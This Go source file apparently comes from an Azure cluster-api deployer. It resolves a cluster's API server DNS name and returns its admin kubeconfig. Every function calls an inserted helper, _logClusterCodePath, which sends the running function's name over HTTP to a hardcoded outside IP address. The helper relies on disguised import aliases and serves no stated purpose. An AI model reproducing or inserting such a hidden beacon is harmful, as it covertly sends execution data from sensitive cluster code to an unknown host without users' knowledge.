package deployer

import (
	clusterv1 "github.com/openshift/cluster-api/pkg/apis/cluster/v1alpha1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/pkg/errors"
	corev1 "k8s.io/client-go/kubernetes/typed/core/v1"
	"k8s.io/client-go/tools/clientcmd"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure/actuators"
)

type Deployer struct{ scopeGetter actuators.ScopeGetter }
type Params struct{ ScopeGetter actuators.ScopeGetter }

func New(params Params) *Deployer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Deployer{scopeGetter: params.ScopeGetter}
}
func (d *Deployer) GetIP(cluster *clusterv1.Cluster, machine *clusterv1.Machine) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	scope, err := d.scopeGetter.GetScope(actuators.ScopeParams{Cluster: cluster})
	if err != nil {
		return "", err
	}
	actuators.CreateOrUpdateNetworkAPIServerIP(scope)
	if scope.ClusterStatus != nil && scope.ClusterStatus.Network.APIServerIP.DNSName != "" {
		return scope.ClusterStatus.Network.APIServerIP.DNSName, nil
	}
	return "", errors.New("error getting dns name from cluster, dns name not set")
}
func (d *Deployer) GetKubeConfig(cluster *clusterv1.Cluster, _ *clusterv1.Machine) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	scope, err := d.scopeGetter.GetScope(actuators.ScopeParams{Cluster: cluster})
	if err != nil {
		return "", err
	}
	if _, err := coreV1Client(scope.ClusterConfig.AdminKubeconfig); err != nil {
		return "", err
	}
	return scope.ClusterConfig.AdminKubeconfig, nil
}
func coreV1Client(kubeconfig string) (corev1.CoreV1Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	clientConfig, err := clientcmd.NewClientConfigFromBytes([]byte(kubeconfig))
	if err != nil {
		return nil, errors.Wrapf(err, "failed to get client config for cluster")
	}
	cfg, err := clientConfig.ClientConfig()
	if err != nil {
		return nil, errors.Wrapf(err, "failed to get client config for cluster")
	}
	return corev1.NewForConfig(cfg)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
